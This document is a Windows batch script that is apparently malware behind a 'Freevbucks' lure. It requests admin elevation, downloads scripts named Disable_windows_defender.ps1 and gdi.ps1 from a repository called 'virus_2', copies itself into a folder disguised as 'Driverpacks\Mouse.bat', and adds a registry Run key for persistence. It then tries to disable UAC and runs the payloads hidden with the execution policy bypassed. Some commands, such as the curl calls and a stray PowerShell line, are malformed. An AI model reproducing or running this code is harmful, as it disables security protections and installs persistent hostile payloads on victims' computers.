@echo off
:: Check if the script is already running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    :: Relaunch the script with elevated rights
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)


curl -O Disable_windows_defender.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/Disable_windows_defender.ps1 > Disable_windows_defender.ps1
curl -O gdi.ps1 https://raw.githubusercontent.com/DanielNov2014/virus_2/refs/heads/main/resources/gdi.ps1 > gdi.ps1


@echo off
setlocal ENABLEEXTENSIONS

set "Key=HKCU\Software\Freevbucks"
set "ValueName=Stage"
set "DefaultValue=1"

:: Check if the key exists
reg query "%Key%" >nul 2>&1
if errorlevel 1 (
   
    reg add "%Key%" /f >nul
) else (
   
)

:: Check if the value exists
reg query "%Key%" /v "%ValueName%" >nul 2>&1
if errorlevel 1 (
    echo Value not found. Creating value...
    reg add "%Key%" /v "%ValueName%" /t REG_DWORD /d %DefaultValue% /f >nul
) else (
  
)


endlocal

@echo off
setlocal ENABLEEXTENSIONS

:: === CONFIGURATION ===
set "TargetFolder=%USERPROFILE%\Driverpacks"
set "TargetFile=%TargetFolder%\Mouse.bat"
set "StartupName=Driverpacks"


:: === DETECT IF ALREADY IN TARGET LOCATION ===
if /i "%~f0"=="%TargetFile%" (
    echo Running from target folder: %TargetFolder%
    goto :ContinueMain
)

:: === CREATE TARGET FOLDER IF MISSING ===
if not exist "%TargetFolder%" (
    mkdir "%TargetFolder%" || (
        echo Failed to create folder.
        exit /b 1
    )
)

:: === COPY SCRIPT TO TARGET ===
copy "%~f0" "%TargetFile%" /Y >nul || (
    echo Failed to copy script.
    exit /b 1
)

:: === ADD TO STARTUP (HKCU\...\Run) ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
    /v "%StartupName%" /t REG_SZ /d "\"%TargetFile%\"" /f >nul || (
    echo Failed to add startup entry.
    exit /b 1
)

:: === DELETE ORIGINAL SCRIPT ===
del "%~f0"

:: === START THE NEW COPY AND EXIT ===
start "" "%TargetFile%"
exit /b

:ContinueMain
REM Get the directory of the batch file
set "SCRIPT_DIR=%~dp0"

REM Run the PowerShell script from the same directory
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0

 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT_DIR%Disable_windows_defender.ps1"
 del Disable_windows_defender.ps1

 powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT_DIR%gdi.ps1"

endlocal



